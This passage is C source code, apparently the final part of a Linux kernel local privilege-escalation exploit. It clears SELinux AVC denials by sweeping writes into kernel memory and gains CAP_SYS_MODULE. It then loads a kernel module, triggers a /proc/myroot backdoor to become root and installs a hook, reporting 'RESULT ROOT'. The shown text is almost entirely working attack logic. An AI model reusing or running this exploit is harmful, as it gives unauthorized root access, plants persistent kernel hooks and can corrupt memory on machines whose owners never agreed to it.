        (unsigned long long)cred, eff_of(0), probe_module());

    /* Measured: some runs reach module_errno=8 straight out of find_cred, i.e.
     * CAP_SYS_MODULE already passes and there is no AVC denial to clear. The
     * AVC sweep writes thousands of words into unrelated kernel memory, and one
     * of those words can be a page of a file we depend on, so it is skipped
     * whenever the capability test already says yes. */
    int gate_errno = probe_module();
    if (gate_errno == 8) {
        say("capability already passes; skipping the AVC sweep\n");
    } else {
        if (!grant_avc(avclo, avchi, window, budget, cred)) {
            say("RESULT avc failed\n");
            return 1;
        }
        say("after avc: module_errno=%d (8 = capability check passed)\n", probe_module());
    }

    if (load_module() != 0) { say("RESULT module load failed\n"); return 1; }
    if (argc >= 2 && !strcmp(argv[1], "survey")) survey_boot();
    say("uid=%d euid=%d capget=0x%08x\n", getuid(), geteuid(), eff_of(0));

    { int p = open("/proc/myroot", O_WRONLY);
      if (p >= 0) {
          if (write(p, "1", 1) == 1) say("/proc/myroot accepted a write; uid=%d\n", getuid());
          close(p);
      } else say("/proc/myroot errno=%d\n", errno); }

    install_hook();

    say("RESULT ROOT uid=%d eff=0x%08x\n", getuid(), eff_of(0));
    return 0;
}
